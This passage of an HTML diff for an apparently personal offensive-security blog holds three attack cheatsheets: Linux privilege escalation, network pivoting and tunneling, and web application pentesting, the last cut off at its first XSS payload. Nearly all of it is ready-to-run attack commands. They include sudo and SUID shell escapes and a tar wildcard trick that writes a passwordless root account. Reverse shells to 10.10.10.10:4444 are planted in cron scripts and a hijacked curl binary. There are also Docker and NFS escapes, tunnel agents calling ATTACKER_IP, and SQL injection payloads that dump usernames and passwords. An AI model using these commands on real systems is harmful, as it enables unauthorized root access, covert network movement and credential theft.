+                    <h1 class="blog-title">Linux Privilege Escalation Cheatsheet</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 18, 2026</span>
+                        <span>16 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="lin-intro">
+                        Linux privilege escalation is a different beast than Windows. There's no LSASS to dump, no Kerberos to roast, and no BloodHound to map your path. What you get instead is a filesystem full of misconfigured permissions, SUID binaries that shouldn't exist, and cron jobs written by people who stopped caring in 2014. Here's how to turn a low-priv shell into root without breaking a sweat.
+                    </p>
+
+                    <h2 id="lin-kernel">Kernel Exploits</h2>
+                    <p>
+                        Always start here. An unpatched kernel is the fastest route to root, and Linux boxes in the wild are often running kernels from the Obama administration.
+                    </p>
+                    <pre><code># Check kernel version
+uname -a
+uname -r
+
+# Check distribution and version
+cat /etc/os-release
+cat /etc/issue
+
+# Search for kernel exploits
+searchsploit linux kernel $(uname -r | cut -d'-' -f1)
+
+# Common exploits by kernel version:
+# 2.6.x  →  Dirty COW (CVE-2016-5195), full-nelson, memodipper
+# 3.x    →  CVE-2016-5195, CVE-2017-6074 (dccp)
+# 4.x    →  CVE-2021-3493 (overlayfs), CVE-2022-0847 (Dirty Pipe)
+# 5.x    →  CVE-2022-0847, CVE-2022-2588 (Dirty Cred)
+
+# Compile and run a kernel exploit
+gcc -o exploit exploit.c
+./exploit</code></pre>
+
+                    <h2 id="lin-sudo">Sudo Misconfigurations</h2>
+                    <p>
+                        The <code>sudo -l</code> output is the most important thing you will read on a Linux box. If a binary is listed with NOPASSWD, you might be one command away from root.
+                    </p>
+                    <pre><code># Check sudo privileges
+sudo -l
+
+# GTFOBins — binaries that can break out when run with sudo:
+# https://gtfobins.github.io/
+
+# Common sudo escapes:
+sudo find / -name "*.txt" -exec /bin/sh \;
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo less /etc/passwd
+# Inside less, type: !/bin/sh
+
+sudo vim /etc/hosts
+# Inside vim, type: :!bash or :set shell=/bin/bash :shell
+
+sudo python3 -c 'import os; os.system("/bin/sh")'
+sudo perl -e 'exec "/bin/sh";'
+sudo ruby -e 'exec "/bin/sh"'
+
+# If sudo allows editing a file with wildcards:
+sudo nano /home/user/*.txt
+# Create a file named: --
+# nano interprets it as a command line argument</code></pre>
+
+                    <h2 id="lin-suid">SUID Binaries</h2>
+                    <p>
+                        SUID binaries run with the permissions of their owner. If root owns a binary with SUID set and that binary can be abused, you have root. GTFOBins is your bible here.
+                    </p>
+                    <pre><code># Find all SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# Find SUID binaries owned by root
+find / -user root -perm -4000 -type f 2>/dev/null
+
+# Common SUID exploits:
+# cp — copy /etc/shadow and crack it
+cp /etc/shadow /tmp/shadow
+
+# nmap — interactive mode
+nmap --interactive
+nmap> !sh
+
+# bash — if bash has SUID, you get a root shell
+bash -p
+
+# find — execute commands
+find . -exec /bin/sh -p \; -quit
+
+# vim — spawn a shell
+vim -c ':!/bin/sh'
+
+# less — same trick as sudo
+less /etc/passwd
+# type !/bin/sh
+
+# tar — wildcard trick
+echo "echo 'user::0:0:::/bin/bash' > /etc/passwd" > /tmp/shell.sh
+echo "" > "/tmp/--checkpoint=1"
+echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"
+sudo tar cf archive.tar /tmp/*</code></pre>
+
+                    <h2 id="lin-cron">Cron Jobs</h2>
+                    <p>
+                        Cron jobs run as root all the time, and the scripts they execute are often world-writable. If you can modify a cron script, you own the box in 60 seconds or less.
+                    </p>
+                    <pre><code># List all cron jobs for all users
+cat /etc/crontab
+ls -la /etc/cron.*
+cat /var/spool/cron/crontabs/* 2>/dev/null
+
+# Check if cron is running
+ps aux | grep cron
+
+# Look for writable cron scripts
+find /etc/cron* -type f -perm -o+w 2>/dev/null
+
+# If a cron job runs a script you can write to:
+echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /path/to/cron_script.sh
+
+# Wildcard cron trick (same as tar wildcard)
+# If a cron job does: tar czf /backup/archive.tar /home/user/*
+# Create files in /home/user/:
+echo "" > /home/user/--checkpoint=1
+echo "" > /home/user/--checkpoint-action=exec=bash\ shell.sh</code></pre>
+
+                    <h2 id="lin-path">PATH Hijacking</h2>
+                    <p>
+                        If a script calls a binary without an absolute path, and you control the PATH variable, you can drop a malicious binary with the same name earlier in the PATH. The script runs your binary instead.
+                    </p>
+                    <pre><code># Check current PATH
+echo $PATH
+
+# Look for scripts that call binaries without full paths
+grep -r "#!/bin/bash" /home/ 2>/dev/null | xargs grep -l "curl\|wget\|cat\|ls" 2>/dev/null
+
+# If a script runs: curl http://example.com
+# And you can modify PATH:
+export PATH=/tmp:$PATH
+cat > /tmp/curl << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+EOF
+chmod +x /tmp/curl
+
+# Wait for the script to run, or trigger it manually if possible</code></pre>
+
+                    <h2 id="lin-capabilities">Capabilities</h2>
+                    <p>
+                        Linux capabilities are fine-grained privileges that can be assigned to binaries. If a binary has <code>cap_setuid</code> or <code>cap_sys_admin</code>, you can abuse it for privilege escalation even without SUID.
+                    </p>
+                    <pre><code># List all binaries with capabilities
+getcap -r / 2>/dev/null
+
+# Common capability exploits:
+# cap_setuid on python3 — instant root
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# cap_sys_admin on tar — mount and chroot
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# cap_dac_read_search on tar — read any file
+tar -czf /tmp/loot.tar.gz /root/.ssh/
+
+# cap_net_raw on tcpdump — packet capture for cred harvesting
+tcpdump -i eth0 -w /tmp/capture.pcap</code></pre>
+
+                    <h2 id="lin-nfs">NFS & Shared Folders</h2>
+                    <p>
+                        NFS shares with <code>no_root_squash</code> are a gift. You can mount the share as root on your attacker machine, create a SUID binary, and execute it on the target for instant root.
+                    </p>
+                    <pre><code># Check for NFS exports on target
+showmount -e target.ip
+
+# Check /etc/exports for no_root_squash
+cat /etc/exports
+
+# On attacker machine, mount the share:
+mkdir /tmp/nfs
+mount -t nfs target.ip:/shared /tmp/nfs
+
+# Create a SUID binary on the share:
+cd /tmp/nfs
+cat > shell.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+EOF
+gcc shell.c -o shell
+chmod +s shell
+
+# On target, execute the SUID binary:
+./shell</code></pre>
+
+                    <h2 id="lin-docker">Docker Escape</h2>
+                    <p>
+                        If you're inside a Docker container and the host's Docker socket is mounted, you can escape trivially. Even without the socket, a privileged container with <code>--privileged</code> is basically root on the host.
+                    </p>
+                    <pre><code># Check if Docker socket is mounted
+ls -la /var/run/docker.sock
+
+# If mounted, spawn a new container with host filesystem:
+docker run -v /:/host -it alpine chroot /host sh
+
+# Check if we're in a privileged container
+cat /proc/1/status | grep CapEff
+# If CapEff is 0000003fffffffff, you're privileged
+
+# Privileged container escape — mount host filesystem:
+fdisk -l
+mkdir /tmp/host
+mount /dev/sda1 /tmp/host
+chroot /tmp/host /bin/bash
+
+# Check for mounted host directories:
+mount | grep /dev/sd
+
+# If /proc is mounted, check for host processes:
+ps aux | grep -v "^$USER"</code></pre>
+
+                    <h2 id="lin-checklist">Quick Checklist</h2>
+                    <ul>
+                        <li><code>uname -a</code> — kernel version</li>
+                        <li><code>sudo -l</code> — sudo privileges</li>
+                        <li><code>find / -perm -u=s -type f 2>/dev/null</code> — SUID binaries</li>
+                        <li><code>find / -user root -perm -4000 -type f 2>/dev/null</code> — SUID root binaries</li>
+                        <li><code>getcap -r / 2>/dev/null</code> — capabilities</li>
+                        <li><code>cat /etc/crontab</code> — cron jobs</li>
+                        <li><code>find /etc/cron* -type f -perm -o+w 2>/dev/null</code> — writable cron scripts</li>
+                        <li><code>echo $PATH</code> — PATH variable</li>
+                        <li><code>find / -writable -type d 2>/dev/null</code> — writable directories</li>
+                        <li><code>find / -perm -o+w -type f 2>/dev/null</code> — world-writable files</li>
+                        <li><code>cat /etc/passwd | grep -v nologin | grep -v false</code> — valid login shells</li>
+                        <li><code>find / -name "*.sh" -writable 2>/dev/null</code> — writable shell scripts</li>
+                        <li><code>id</code> — group memberships</li>
+                        <li><code>groups</code> — all groups</li>
+                        <li><code>find / -group YOURGROUP -writable 2>/dev/null</code> — files writable by your group</li>
+                        <li>Run <code>linPEAS.sh</code> or <code>LinEnum.sh</code> if nothing obvious stands out</li>
+                    </ul>
+
+                    <blockquote>
+                        "Linux privilege escalation is just reading the filesystem carefully enough. The OS tells you exactly where the holes are — you just have to look."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#" class="active">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: NETWORK PIVOTING ========== -->
+    <div id="page-network" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#net-intro" class="toc-link" onclick="scrollToSection('net-intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#net-ssh" class="toc-link" onclick="scrollToSection('net-ssh')">SSH Tunnels</a></li>
+                    <li class="sidebar-item level-2"><a href="#net-local" class="toc-link" onclick="scrollToSection('net-local')">Local Port Forward</a></li>
+                    <li class="sidebar-item level-2"><a href="#net-remote" class="toc-link" onclick="scrollToSection('net-remote')">Remote Port Forward</a></li>
+                    <li class="sidebar-item level-2"><a href="#net-dynamic" class="toc-link" onclick="scrollToSection('net-dynamic')">Dynamic SOCKS Proxy</a></li>
+                    <li class="sidebar-item"><a href="#net-ligolo" class="toc-link" onclick="scrollToSection('net-ligolo')">Ligolo-ng</a></li>
+                    <li class="sidebar-item"><a href="#net-chisel" class="toc-link" onclick="scrollToSection('net-chisel')">Chisel</a></li>
+                    <li class="sidebar-item"><a href="#net-proxychains" class="toc-link" onclick="scrollToSection('net-proxychains')">ProxyChains</a></li>
+                    <li class="sidebar-item"><a href="#net-icmp" class="toc-link" onclick="scrollToSection('net-icmp')">ICMP Tunneling</a></li>
+                    <li class="sidebar-item"><a href="#net-dns" class="toc-link" onclick="scrollToSection('net-dns')">DNS Tunneling</a></li>
+                    <li class="sidebar-item"><a href="#net-checklist" class="toc-link" onclick="scrollToSection('net-checklist')">Quick Reference</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">Network</span>
+                        <span class="blog-tag">Pivoting</span>
+                        <span class="blog-tag">Cheatsheet</span>
+                    </div>
+                    <h1 class="blog-title">Network Pivoting & Tunneling Cheatsheet</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 20, 2026</span>
+                        <span>14 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="net-intro">
+                        You popped one box in a segmented network and now you need to touch the crown jewels three VLANs away. Every port is filtered, every protocol is inspected, and the firewall logs make the NSA look lazy. Here's how to move through that network like smoke — through tunnels, proxies, and protocols that nobody thinks to block.
+                    </p>
+
+                    <h2 id="net-ssh">SSH Tunnels</h2>
+                    <p>
+                        SSH is the Swiss Army knife of pivoting. Every Linux box has it, every firewall allows it, and it can tunnel literally anything. If you have SSH access to a compromised host, you have a highway into their network.
+                    </p>
+
+                    <h3 id="net-local">Local Port Forwarding</h3>
+                    <p>
+                        Forward a port from the target network to your local machine. Useful when you want to access an internal service (like a web app on port 8080) through a compromised host.
+                    </p>
+                    <pre><code># Forward target's internal port 8080 to your local port 9090
+# You access it via localhost:9090
+ssh -L 9090:internal.target:8080 user@compromised.host
+
+# Multiple forwards in one command
+ssh -L 9090:web.internal:80 -L 9091:db.internal:3306 user@compromised.host
+
+# Background the tunnel
+ssh -fN -L 9090:internal.target:8080 user@compromised.host</code></pre>
+
+                    <h3 id="net-remote">Remote Port Forwarding</h3>
+                    <p>
+                        Forward a port from your attacker machine to the target network. Useful when the target can't reach you directly but you need to expose a tool (like a payload server) to the target.
+                    </p>
+                    <pre><code># Forward your local port 4444 to the compromised host's port 4444
+# Target can now reach your listener via compromised.host:4444
+ssh -R 4444:localhost:4444 user@compromised.host
+
+# Enable GatewayPorts so the forward is accessible from other hosts
+ssh -R 0.0.0.0:4444:localhost:4444 user@compromised.host
+# (Requires GatewayPorts yes in sshd_config)</code></pre>
+
+                    <h3 id="net-dynamic">Dynamic SOCKS Proxy</h3>
+                    <p>
+                        Create a SOCKS proxy through the compromised host. Route all your traffic through it with ProxyChains. This is the most flexible pivoting technique.
+                    </p>
+                    <pre><code># Create SOCKS proxy on local port 1080
+ssh -D 1080 user@compromised.host
+
+# Background it
+ssh -fN -D 1080 user@compromised.host
+
+# Use with proxychains
+proxychains nmap -sT -p 80,443,8080 10.10.10.0/24
+proxychains firefox
+proxychains impacket-psexec domain/admin@10.10.10.10</code></pre>
+
+                    <h2 id="net-ligolo">Ligolo-ng</h2>
+                    <p>
+                        Ligolo-ng is the modern replacement for everything. It creates a tun interface, gives you a real network route into the target network, and handles multiple tunnels with ease. It's what Meterpreter's <code>autoroute</code> wishes it was.
+                    </p>
+                    <pre><code># === ATTACKER MACHINE ===
+# Start the Ligolo proxy
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Add a tun interface for routing
+sudo ip tuntap add user YOURUSER mode tun ligolo
+sudo ip link set ligolo up
+
+# === COMPROMISED TARGET ===
+# Run the agent pointing at your attacker
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# === BACK ON ATTACKER ===
+# In the Ligolo proxy session, start the tunnel
+# Type: session
+# Select the session
+# Type: start
+
+# Route traffic through the tunnel
+sudo ip route add 10.10.10.0/24 dev ligolo
+
+# Now you can directly access 10.10.10.0/24 from your attacker
+nmap -sT -p 22,80,443,445,3389 10.10.10.0/24
+
+# Forward a specific port
+# In Ligolo proxy: listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp</code></pre>
+
+                    <h2 id="net-chisel">Chisel</h2>
+                    <p>
+                        Chisel is a fast TCP tunnel over HTTP, secured via SSH. It's great when you only have HTTP outbound and need to punch through restrictive firewalls.
+                    </p>
+                    <pre><code># === ATTACKER MACHINE ===
+# Start the Chisel server
+./chisel server -p 8080 --reverse
+
+# === COMPROMISED TARGET ===
+# Connect back and create a SOCKS proxy
+./chisel client http://ATTACKER_IP:8080 R:socks
+
+# Or forward a specific port
+./chisel client http://ATTACKER_IP:8080 R:9090:internal.target:80
+
+# Now on attacker, use the SOCKS proxy on port 1080
+# (Chisel tells you which port it opened)
+proxychains nmap -sT -p 80,443 10.10.10.0/24
+
+# Multiple forwards
+./chisel client http://ATTACKER_IP:8080 R:9090:web.internal:80 R:9091:db.internal:3306</code></pre>
+
+                    <h2 id="net-proxychains">ProxyChains</h2>
+                    <p>
+                        ProxyChains forces any TCP connection through your proxy. Configure it once, then prefix any command with <code>proxychains</code> and it routes through your tunnel.
+                    </p>
+                    <pre><code># /etc/proxychains4.conf — add your proxy at the bottom:
+[ProxyList]
+socks5  127.0.0.1 1080
+
+# Use with any tool
+proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
+proxychains smbclient -L //10.10.10.10
+proxychains python3 exploit.py
+proxychains curl http://10.10.10.10:8080
+
+# For tools that don't support proxies natively:
+proxychains impacket-psexec domain/admin@10.10.10.10
+proxychains evil-winrm -i 10.10.10.10 -u admin</code></pre>
+
+                    <h2 id="net-icmp">ICMP Tunneling</h2>
+                    <p>
+                        When every TCP and UDP port is blocked, ICMP usually still works because ping is "essential." Tools like <code>icmpsh</code> and <code>ptunnel</code> tunnel data through ICMP echo requests and replies.
+                    </p>
+                    <pre><code># === ATTACKER ===
+# Start the icmpsh listener
+python icmpsh_m.py ATTACKER_IP TARGET_IP
+
+# === TARGET ===
+# Run the icmpsh client (Windows)
+icmpsh.exe -t ATTACKER_IP
+
+# === ptunnel for TCP over ICMP ===
+# Attacker: sudo ptunnel -p 0.0.0.0 -lp 8888 -da target.internal -dp 22
+# Now connect to localhost:8888 to reach target.internal:22
+
+# === pingtunnel (more modern) ===
+# Attacker: ./pingtunnel -type server
+# Target: ./pingtunnel -type client -l :4455 -s ATTACKER_IP -t ATTACKER_IP:4455
+# Forwards target's local port 4455 to attacker's port 4455 over ICMP</code></pre>
+
+                    <h2 id="net-dns">DNS Tunneling</h2>
+                    <p>
+                        DNS is the last protocol anyone blocks. If you can resolve names, you can tunnel data. It's slow, it's noisy if you don't throttle it, but it works when nothing else does.
+                    </p>
+                    <pre><code># === iodine ===
+# Requires a domain with NS records pointing to your attacker
+# Attacker: sudo iodined -f 10.0.0.1 tunnel.yourdomain.com -P yourpassword
+# Target: sudo iodine -f tunnel.yourdomain.com -P yourpassword
+# Creates a tun interface. Now you have a tunnel.
+
+# === dnscat2 ===
+# Attacker: ruby dnscat2.rb yourdomain.com
+# Target: ./dnscat2 yourdomain.com
+# Interactive shell over DNS
+
+# === dns2tcp ===
+# For specific port forwarding over DNS
+# Config file defines resources that map to internal services</code></pre>
+
+                    <h2 id="net-checklist">Quick Reference</h2>
+                    <table style="width:100%; border-collapse: collapse; margin-bottom: 20px;">
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; font-weight: 600;">Scenario</td>
+                            <td style="padding: 8px 12px; font-weight: 600;">Tool</td>
+                            <td style="padding: 8px 12px; font-weight: 600;">Command</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">Access internal web app</td>
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">SSH</td>
+                            <td style="padding: 8px 12px;"><code>ssh -L 9090:internal:80 user@pivot</code></td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">Full network access</td>
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">Ligolo-ng</td>
+                            <td style="padding: 8px 12px;"><code>proxy + agent + ip route</code></td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">HTTP-only outbound</td>
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">Chisel</td>
+                            <td style="padding: 8px 12px;"><code>chisel client http://attacker:8080 R:socks</code></td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">Everything blocked except ping</td>
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">icmpsh</td>
+                            <td style="padding: 8px 12px;"><code>python icmpsh_m.py attacker target</code></td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border);">
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">DNS resolution works</td>
+                            <td style="padding: 8px 12px; color: var(--text-secondary);">dnscat2</td>
+                            <td style="padding: 8px 12px;"><code>ruby dnscat2.rb domain.com</code></td>
+                        </tr>
+                    </table>
+
+                    <blockquote>
+                        "Network segmentation is just a suggestion. If you can reach one host, you can reach them all — you just need to be patient and creative about the path."
+                    </blockquote>
+                </div>
+
+                <div class="footer">
+                    <p>Built by <a href="https://hackherway.neocities.org" target="_blank">hackherway</a> // No rights reserved, steal it</p>
+                </div>
+            </main>
+
+            <aside class="sidebar right-sidebar">
+                <div class="sidebar-title">Categories</div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Active Directory</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Enumeration</a></li>
+                        <li class="sidebar-item"><a href="#">Kerberos Attacks</a></li>
+                        <li class="sidebar-item"><a href="#">LDAP & DNS</a></li>
+                        <li class="sidebar-item"><a href="#">Privilege Escalation</a></li>
+                        <li class="sidebar-item"><a href="#">Lateral Movement</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Network Security</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#" class="active">ARP Spoofing</a></li>
+                        <li class="sidebar-item"><a href="#">DHCP Starvation</a></li>
+                        <li class="sidebar-item"><a href="#">DNS Exfiltration</a></li>
+                        <li class="sidebar-item"><a href="#">Wireless Attacks</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Offensive Tools</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">BloodHound</a></li>
+                        <li class="sidebar-item"><a href="#">Impacket</a></li>
+                        <li class="sidebar-item"><a href="#">CrackMapExec</a></li>
+                        <li class="sidebar-item"><a href="#">Responder</a></li>
+                        <li class="sidebar-item"><a href="#">Mimikatz</a></li>
+                    </ul>
+                </div>
+                <div class="sidebar-group">
+                    <div class="sidebar-group-title" onclick="toggleGroup(this)">Methodology</div>
+                    <ul class="sidebar-items">
+                        <li class="sidebar-item"><a href="#">Reconnaissance</a></li>
+                        <li class="sidebar-item"><a href="#">Threat Hunting</a></li>
+                        <li class="sidebar-item"><a href="#">Red Team Ops</a></li>
+                        <li class="sidebar-item"><a href="#">Purple Teaming</a></li>
+                    </ul>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+    <!-- ========== BLOG POST: WEB APP PENTESTING ========== -->
+    <div id="page-web" class="page hidden">
+        <div class="container blog-layout">
+            <aside class="sidebar toc-sidebar">
+                <div class="sidebar-title">On This Page</div>
+                <ul class="sidebar-items" style="border-left: none; padding-left: 0;">
+                    <li class="sidebar-item"><a href="#web-intro" class="toc-link" onclick="scrollToSection('web-intro')">Introduction</a></li>
+                    <li class="sidebar-item"><a href="#web-recon" class="toc-link" onclick="scrollToSection('web-recon')">Reconnaissance</a></li>
+                    <li class="sidebar-item"><a href="#web-sqli" class="toc-link" onclick="scrollToSection('web-sqli')">SQL Injection</a></li>
+                    <li class="sidebar-item level-2"><a href="#web-union" class="toc-link" onclick="scrollToSection('web-union')">Union-Based</a></li>
+                    <li class="sidebar-item level-2"><a href="#web-blind" class="toc-link" onclick="scrollToSection('web-blind')">Blind / Time-Based</a></li>
+                    <li class="sidebar-item"><a href="#web-xss" class="toc-link" onclick="scrollToSection('web-xss')">XSS</a></li>
+                    <li class="sidebar-item"><a href="#web-ssrf" class="toc-link" onclick="scrollToSection('web-ssrf')">SSRF</a></li>
+                    <li class="sidebar-item"><a href="#web-idor" class="toc-link" onclick="scrollToSection('web-idor')">IDOR</a></li>
+                    <li class="sidebar-item"><a href="#web-jwt" class="toc-link" onclick="scrollToSection('web-jwt')">JWT Attacks</a></li>
+                    <li class="sidebar-item"><a href="#web-upload" class="toc-link" onclick="scrollToSection('web-upload')">File Upload</a></li>
+                    <li class="sidebar-item"><a href="#web-methodology" class="toc-link" onclick="scrollToSection('web-methodology')">Methodology</a></li>
+                </ul>
+            </aside>
+
+            <main class="main blog-post">
+                <article class="blog-header">
+                    <div class="blog-tags">
+                        <span class="blog-tag">Web</span>
+                        <span class="blog-tag">Pentesting</span>
+                        <span class="blog-tag">Cheatsheet</span>
+                    </div>
+                    <h1 class="blog-title">Web Application Pentesting Cheatsheet</h1>
+                    <div class="blog-meta">
+                        <div class="author">
+                            <div class="author-avatar">H</div>
+                            <span>hackherway</span>
+                        </div>
+                        <span>May 22, 2026</span>
+                        <span>20 min read</span>
+                    </div>
+                </article>
+
+                <div class="blog-content">
+                    <p id="web-intro">
+                        Web applications are where the money lives. The database credentials, the user PII, the admin panels with zero MFA — it's all behind a login page that someone wrote in a hurry during a sprint. Web pentesting is systematic: find the input, fuzz the input, abuse the input. Rinse and repeat until you own the database or the company files a bug bounty report about you.
+                    </p>
+
+                    <h2 id="web-recon">Reconnaissance</h2>
+                    <p>
+                        Before you break anything, you need to know what exists. Subdomains, hidden endpoints, technology stacks, and API documentation are your roadmap.
+                    </p>
+                    <pre><code># Subdomain enumeration
+subfinder -d target.com -all
+amass enum -d target.com -active
+assetfinder --subs-only target.com
+
+# Brute force subdomains
+gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
+
+# Directory and file discovery
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js
+feroxbuster -u https://target.com -w /usr/share/wordlists/raft-medium-directories.txt
+
+# Technology fingerprinting
+whatweb https://target.com
+wappalyzer https://target.com
+nmap -p80,443 --script http-title,http-enum target.com
+
+# API endpoint discovery
+gobuster dir -u https://api.target.com -w /usr/share/wordlists/api-endpoints.txt
+# Look for swagger docs: /swagger-ui.html, /api-docs, /v2/api-docs
+# Look for GraphQL: /graphql, /api/graphql
+
+# JavaScript analysis — find hidden endpoints
+curl -s https://target.com/app.js | grep -oE "https?://[^"\'\s]+"
+curl -s https://target.com/app.js | grep -oE "/api/[^"\'\s]+"
+# Use LinkFinder or getjs for automated extraction</code></pre>
+
+                    <h2 id="web-sqli">SQL Injection</h2>
+                    <p>
+                        SQL injection never died. It just got better at hiding. Modern apps use ORMs and parameterized queries, but someone always forgets to sanitize the <code>ORDER BY</code> clause or the search filter. Here's how to find and exploit it.
+                    </p>
+
+                    <h3 id="web-union">Union-Based SQLi</h3>
+                    <pre><code># Step 1: Find the injection point
+# Try in every parameter: id, search, sort, filter, category
+?id=1' AND 1=1 --
+?id=1' AND 1=2 --
+?id=1" AND 1=1 --
+?id=1) AND 1=1 --
+?id=1')) AND 1=1 --
+
+# Step 2: Determine column count
+?id=1' ORDER BY 1 --
+?id=1' ORDER BY 2 --
+?id=1' ORDER BY 3 --
+# Keep incrementing until error
+
+# Step 3: Union select with NULLs
+?id=1' UNION SELECT NULL,NULL,NULL --
+?id=1' UNION SELECT NULL,NULL,NULL,NULL --
+# Match the column count
+
+# Step 4: Find which column reflects
+?id=1' UNION SELECT 1,2,3,4 --
+# The reflected number tells you which position is visible
+
+# Step 5: Extract data
+?id=1' UNION SELECT 1,database(),3,4 --
+?id=1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() --
+?id=1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users' --
+?id=1' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users --</code></pre>
+
+                    <h3 id="web-blind">Blind / Time-Based SQLi</h3>
+                    <p>
+                        When the app doesn't reflect query results but still executes your SQL, you use boolean or time-based inference to extract data one bit at a time.
+                    </p>
+                    <pre><code># Boolean-based blind
+?id=1' AND SUBSTRING((SELECT database()),1,1)='a' --
+?id=1' AND SUBSTRING((SELECT database()),1,1)='b' --
+# If page content changes, the character is correct
+
+# Time-based blind
+?id=1' AND IF(SUBSTRING((SELECT database()),1,1)='a', SLEEP(5), 0) --
+?id=1' AND IF(SUBSTRING((SELECT database()),1,1)='b', SLEEP(5), 0) --
+# If response takes 5 seconds, the character is correct
+
+# SQLMap for automation
+sqlmap -u "https://target.com/page?id=1" --batch --dump
+sqlmap -u "https://target.com/page?id=1" --batch --dump-all
+sqlmap -u "https://target.com/page?id=1" --batch --os-shell
+sqlmap -u "https://target.com/page?id=1" --batch --file-read=/etc/passwd</code></pre>
+
+                    <h2 id="web-xss">Cross-Site Scripting (XSS)</h2>
+                    <p>
+                        XSS is about injecting JavaScript that executes in another user's browser. Stored XSS is gold — it persists and hits every admin who views the page. Reflected XSS is useful for stealing session tokens via a malicious link.
+                    </p>
+                    <pre><code># Basic payload
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
